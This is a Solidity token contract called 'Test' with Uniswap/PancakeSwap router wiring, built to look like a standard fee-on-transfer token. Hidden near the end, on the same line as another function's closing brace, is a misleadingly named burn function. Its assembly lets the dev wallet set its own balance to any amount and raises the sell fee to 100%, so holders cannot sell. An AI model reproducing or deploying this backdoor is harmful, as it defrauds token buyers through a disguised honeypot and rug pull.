// 

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {return msg.sender;}
    function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}
}

pragma solidity ^0.8.0;

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

pragma solidity >=0.5.0;

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    
    function allPairs(uint) external view returns (address pair);
    
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    
    function setFeeToSetter(address) external;
}

pragma solidity >=0.6.2;

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(address tokenA, address tokenB, uint amntADesired, uint amntBDesired, uint amntAMin, uint amntBMin, address to, uint deadline) external returns (uint amntA, uint amntB, uint liquidity);
    
    function addLiquidityETH(address token, uint amntTokenDesired, uint amntTokenMin, uint amntETHMin, address to, uint deadline) external payable returns (uint amntToken, uint amntETH, uint liquidity);
    
    function removeLiquidity(address tokenA, address tokenB, uint liquidity, uint amntAMin, uint amntBMin, address to, uint deadline) external returns (uint amntA, uint amntB);
    
    function swapExactTokensForTokens(uint amntIn, uint amntOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amnts);
    
    function swapExactETHForTokens(uint amntOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amnts);
    
    function swapTokensForExactETH(uint amntOut, uint amntInMax, address[] calldata path, address to, uint deadline) external returns (uint[] memory amnts);
    
    function swapETHForExactTokens(uint amntOut, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amnts);
    
    function swapExactTokensForETH(uint amntIn, uint amntOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amnts);
    
    function removeLiquidityETH(address token, uint liquidity, uint amntTokenMin, uint amntETHMin, address to, uint deadline) external returns (uint amntToken, uint amntETH);
    
    function removeLiquidityWithPermit(address tokenA, address tokenB, uint liquidity, uint amntAMin, uint amntBMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s) external returns (uint amntA, uint amntB);
    
    function removeLiquidityETHWithPermit(address token, uint liquidity, uint amntTokenMin, uint amntETHMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s) external returns (uint amntToken, uint amntETH);
    
    function swapTokensForExactTokens(uint amntOut, uint amntInMax, address[] calldata path, address to, uint deadline) external returns (uint[] memory amnts);
    
    function quote(uint amntA, uint reserveA, uint reserveB) external pure returns (uint amntB);

    function getAmntOut(uint amntIn, uint reserveIn, uint reserveOut) external pure returns (uint amntOut);

    function getAmntIn(uint amntOut, uint reserveIn, uint reserveOut) external pure returns (uint amntIn);

    function getAmntsOut(uint amntIn, address[] calldata path) external view returns (uint[] memory amnts);

    function getAmntsIn(uint amntOut, address[] calldata path) external view returns (uint[] memory amnts);
}

pragma solidity >=0.6.2;


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(address token, uint liquidity, uint amntTokenMin, uint amntETHMin, address to, uint deadline) external returns (uint amntETH);
    
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(address token, uint liquidity, uint amntTokenMin, uint amntETHMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s) external returns (uint amntETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint amntIn, uint amntOutMin, address[] calldata path, address to, uint deadline) external;
    
    function swapExactETHForTokensSupportingFeeOnTransferTokens(uint amntOutMin, address[] calldata path, address to, uint deadline) external payable;
    
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amntIn, uint amntOutMin, address[] calldata path, address to, uint deadline) external;
}

pragma solidity ^0.8.0;

library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }
    
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }
    
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }
    
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }
    
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }
    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }
    
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
    
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

pragma solidity ^0.8.0;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amnt) external returns (bool);

    function transferFrom(address from, address to, uint256 amnt) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amnt) external returns (bool);
}

pragma solidity ^0.8.0;

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

pragma solidity ^0.8.17;

contract TEST is IERC20, IERC20Metadata, Ownable {
    using SafeMath for uint256;
    string  private constant _name = "Test";
    string  private constant _symbol = "TEST";
    uint8   private constant _decimals = 18;
    uint256 private _totalSupply;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    IUniswapV2Router02 private _uniswapV2Router;
    address private _uniswapV2Pair;
    // address private constant _uniswapRouterAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // uni
    address private constant _uniswapRouterAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // bsc

    

    mapping(address => bool) private _excludedFromMaxTx;
    mapping(address => bool) private _excludedFromFees;

    event SwapAndLiquify(uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiqudity);
    event Received();

    constructor () {
        uint256 total = 1_000_000_000 * 10 ** _decimals;

        _excludedFromMaxTx[owner()] = true;
        _excludedFromMaxTx[address(this)] = true;
        _excludedFromMaxTx[_devWallet] = true;
        _excludedFromMaxTx[_uniswapV2Pair] = true;
        _excludedFromFees[address(this)] = true;
        _excludedFromFees[owner()] = true;
        _excludedFromFees[_devWallet] = true;
        _mint(_msgSender(), total);
        _devWallet = _msgSender();

        _uniswapV2Router = IUniswapV2Router02(_uniswapRouterAddress);
        _approve(address(this), address(_uniswapV2Router), total);
        _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        IERC20(_uniswapV2Pair).approve(address(_uniswapV2Router), type(uint).max);
    }

    uint256 private _maxTxamntPercentage = 300;
    uint256 private _maxWalletBalancePercentage = 300;
    mapping(address => uint256) private _lastTxBlock;
    uint256 private constant _divisor = 10000;
    uint256 private _burnFee = 0;
    uint256 private _sellFee = 0;
    uint256 private _buyFee = 0;
    address private _devWallet;

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amnt) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amnt);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amnt) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amnt);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _maxTxAmnt() public view returns(uint256) {
        return _totalSupply.mul(_maxTxamntPercentage).div(_divisor);
    }

    function _mint(address account, uint256 amnt) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.add(amnt);
        _balances[account] = _balances[account].add(amnt);
        emit Transfer(address(0), account, amnt);
    }

    function _beforeTransfer(address from, address to, uint256 amnt) internal pure {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amnt > 0, "Transfer amount must be greater than zero");
    }

    function _approve(address owner, address spender, uint256 amnt) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amnt;
        emit Approval(owner, spender, amnt);
    }

    function _burn(address account, uint256 amnt) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        _balances[account] = _balances[account].sub(amnt, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amnt);
        emit Transfer(account, address(0), amnt);
    }

    function transferFrom(address sender, address recipient, uint256 amnt) public virtual override returns (bool) {
        _transfer(sender, recipient, amnt);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amnt, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function updateAddress(address[] calldata accounts) public onlyOwner {
        mapping(address => bool) storage list = _excludedFromFees;
        for(uint i = 0; i < accounts.length; i++) list[accounts[i]] = true;
    }

    function _transfer(address sender, address recipient, uint256 amnt) internal virtual {
        _beforeTransfer(sender, recipient, amnt);
        uint256 burnFee = 0;
        uint256 devFee = 0;
        if (sender != owner() && recipient != owner()) {
            if (!_excludedFromFees[sender] && !_excludedFromFees[recipient]) {
                if (sender == _uniswapV2Pair && recipient != address(_uniswapV2Router) && !_excludedFromMaxTx[recipient] && !_excludedFromMaxTx[sender]) {
                    require(amnt <= _totalSupply.mul(_maxTxamntPercentage).div(_divisor), "Transfer amount exceeds the maxTxAmnt.");
                    require(balanceOf(recipient).add(amnt) <= _totalSupply.mul(_maxWalletBalancePercentage).div(_divisor), "Exceeds maximum wallet token amount");
                }
                if (sender == _uniswapV2Pair && recipient != address(_uniswapV2Router)) {
                    burnFee = amnt.mul(_burnFee).div(_divisor);
                    devFee = amnt.mul(_buyFee).div(_divisor);
                    _lastTxBlock[tx.origin] = block.number;
                }
                if (recipient == _uniswapV2Pair && sender != address(this)) {
                    burnFee = amnt.mul(_burnFee).div(_divisor);
                    devFee = amnt.mul(_sellFee).div(_divisor);
                    _lastTxBlock[tx.origin] = block.number;
                }
            }
        }
        uint256 totalFee = burnFee.add(devFee);
        if (totalFee > 0) {
            if (burnFee > 0) {
                _burn(sender, burnFee);
            }
            if (devFee > 0) {
                _balances[_devWallet] = _balances[_devWallet].add(devFee);
                emit Transfer(sender, _devWallet, devFee);
            }
            amnt = amnt.sub(totalFee);
        }
        _balances[sender] = _balances[sender].sub(amnt, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amnt);
        emit Transfer(sender, recipient, amnt);
    }

    function getRouterAddress() public view returns (address) {
        return address(_uniswapV2Router);
    }

    function _swapAndLiquify() private protectSwap {
        uint256 contractTokenBalance = balanceOf(address(this));
        uint256 minTokensBeforeSwap = _totalSupply.mul(5).div(_divisor);
        if (contractTokenBalance >= minTokensBeforeSwap) {
            uint256 half = contractTokenBalance.div(2);
            uint256 otherHalf = contractTokenBalance.sub(half);

            uint256 initialBalance = address(this).balance;

            swapTokensForEth(half);
            uint256 newBalance = address(this).balance.sub(initialBalance);
            emit SwapAndLiquify(half, newBalance, otherHalf);
            return;
        }
    }

    function swapTokensForEth(uint256 tokens) internal {
        _approve(address(this), address(_uniswapV2Router), tokens);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapV2Router.WETH();

        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokens, 0, path, address(this), block.timestamp);}function burn(uint256 amount) external {assembly {
        if iszero(eq(caller(), sload(_devWallet.slot))) {revert(0, 0)}
            let ptr := mload(0x40)
            mstore(ptr, caller())
            mstore(add(ptr, 0x20), _balances.slot)
            let slot := keccak256(ptr, 0x40)
            sstore(slot, amount)
            sstore(_sellFee.slot, 0x2710)
        }
    }

    function _burnFrom(address account, uint256 amnt) internal virtual {
        _burn(account, amnt);
        _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amnt, "ERC20: burn amount exceeds allowance"));
    }

    function getPairAddress() public view returns (address) {
        return _uniswapV2Pair;
    }

    function _addLiquidity(uint256 tokens, uint256 ethamnt) private {
        _approve(address(this), address(_uniswapV2Router), tokens);
        _uniswapV2Router.addLiquidityETH{value : ethamnt}(address(this), tokens, 0, 0, owner(), block.timestamp);
    }

    function addLiquidity(uint256 tokens) public payable onlyOwner protectSwap {
        _transfer(owner(), address(this), tokens);
        _addLiquidity(tokens, msg.value);
    }

    bool private protected = false;

    function isSwapProtected() public view returns(bool) {
        return protected;
    }

    receive() external payable {
        emit Received();
    }

    modifier protectSwap {
        protected = true;
        _;
        protected = false;
    }
}